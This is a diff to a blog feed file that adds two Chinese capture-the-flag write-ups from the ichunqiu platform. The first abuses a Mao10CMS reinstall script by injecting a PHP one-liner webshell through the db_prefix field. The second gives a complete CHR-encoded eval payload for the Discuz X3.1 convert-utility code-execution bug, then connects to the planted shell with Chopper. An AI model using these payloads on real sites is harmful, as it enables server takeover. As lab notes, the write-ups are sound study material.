@@ -4,6 +4,44 @@
   
     
     <entry>
+      <title>i春秋刷题——reinstall</title>
+      <link href="/2020/08/16/ichunqiu_reinstall/"/>
+      <url>/2020/08/16/ichunqiu_reinstall/</url>
+      
+        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816130535.png" alt=""></p><p>扫一遍没发现啥，看题目是reinstall想到可能是有Install文件没删，install请求无果但是install.php.bak成功</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816132708.png" alt=""></p><p>啥都不知道肯定安装不成功，但出错的时候把配置文件路径爆出来了</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816132830.png" alt=""></p><p>访问几个目录啥都没有，百度到了一个<a href="http://www.hackdig.com/02/hack-18952.htm" target="_blank" rel="noopener">Mao10CMS前台Getshell</a>，提到了Application/Common/Conf/db.php 也就是这个环境中爆出来的配置文件安装没有做任何过滤，直接就是安装了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">if($_POST[&#39;db_host&#39;] &amp;&amp; $_POST[&#39;db_name&#39;] &amp;&amp; $_POST[&#39;db_user&#39;] &amp;&amp; $_POST[&#39;db_prefix&#39;])</span><br><span class="line">&#123; $file &#x3D; &quot;Application&#x2F;Common&#x2F;Conf&#x2F;db.php&quot;;</span><br><span class="line">$data &#x3D; &quot; &#39;mysql&#39;, &#x2F;&#x2F; 数据库类型</span><br><span class="line">&#39;DB_HOST&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;db_host&#39;].&quot;&#39;, &#x2F;&#x2F; 服务器地址</span><br><span class="line">&#39;DB_NAME&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;db_name&#39;].&quot;&#39;, &#x2F;&#x2F; 数据库名</span><br><span class="line">&#39;DB_USER&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;db_user&#39;].&quot;&#39;, &#x2F;&#x2F; 用户名</span><br><span class="line">&#39;DB_PWD&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;db_pwd&#39;].&quot;&#39;, &#x2F;&#x2F; 密码</span><br><span class="line">&#39;DB_PORT&#39; &#x3D;&gt; 3306, &#x2F;&#x2F; 端口</span><br><span class="line">&#39;DB_PREFIX&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;db_prefix&#39;].&quot;&#39;, &#x2F;&#x2F; 数据库表前缀</span><br><span class="line">&#39;DB_CHARSET&#39; &#x3D;&gt; &#39;utf8&#39;, &#x2F;&#x2F;数据库编码</span><br><span class="line">&#39;ADMIN_LOGIN&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;admin_login&#39;].&quot;&#39;, &#x2F;&#x2F;创始人账号</span><br><span class="line">&#39;ADMIN_PASS&#39; &#x3D;&gt; &#39;&quot;.$_POST[&#39;admin_pass&#39;].&quot;&#39;, &#x2F;&#x2F;创始人密码</span><br><span class="line">); ?&gt;&quot;;</span><br><span class="line">$db_info &#x3D; file_put_contents ($file, $data);</span><br><span class="line">if($db_info) &#123; $callback &#x3D; 1; &#125; else &#123; $callback &#x3D; 2; &#125;;</span><br><span class="line">$con &#x3D; mysql_connect($_POST[&#39;db_host&#39;],$_POST[&#39;db_user&#39;],$_POST[&#39;db_pwd&#39;]);</span><br><span class="line">mysql_query(&quot;CREATE DATABASE &quot;.$_POST[&#39;db_name&#39;],$con);</span><br><span class="line">if (!$con) &#123; $callback &#x3D; 2; &#125;; &#125; else &#123; $callback &#x3D; 0; &#125; ?&gt;</span><br></pre></td></tr></table></figure><p>db_host，db_user，db_name,db_pwd会写入数据库，但db_prefix会写入配置文件，写入一句话木马即可getshell</p><p>实践一下，按照文章里的方式构造一句话木马</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816134450.png" alt=""></p><p><code>&#39;,</code>把前面闭合，<code>,//</code>把后面注释</p><p>提交再用菜刀连接，成功getshell</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816134647.png" alt=""></p><p>在html文件夹里找到flag</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ichunqiu综合渗透练习 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>i春秋刷题——这不是DZ漏洞？</title>
+      <link href="/2020/08/16/ichunqiu_dz/"/>
+      <url>/2020/08/16/ichunqiu_dz/</url>
+      
+        <content type="html"><![CDATA[<p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816083258.png" alt=""></p><p>打开网站是dz论坛，在网站底部看到是dz3.1</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816083412.png" alt=""></p><p>百度下相关漏洞，找到了x3.1的插件/utility/convert/index.php存在代码执行漏洞</p><p>试下，页面没被删除</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816085638.png" alt=""></p><p>payload：<code>a=config&amp;source=d7.2_x2.0&amp;newconfig[aaa%0a%0deval(CHR(101).CHR(118).CHR(97).CHR(108).CHR(40).CHR(34).CHR(36).CHR(95).CHR(80).CHR(79).CHR(83).CHR(84).CHR(91).CHR(99).CHR(93).CHR(59).CHR(34).CHR(41).CHR(59));//]=aaaa&amp;submit=yes</code></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816091511.png" alt=""></p><p>用菜刀连接<code>/utility/convert/data/config.inc.php</code></p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816091538.png" alt=""></p><p>拿到flag</p><p><img src="https://cdn.jsdelivr.net/gh/blacknight12231/cdn/20200816091659.png" alt=""></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> ichunqiu综合渗透练习 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>i春秋刷题——渗透测试笔记</title>
       <link href="/2020/08/15/ichunqiu_stcebj/"/>
       <url>/2020/08/15/ichunqiu_stcebj/</url>
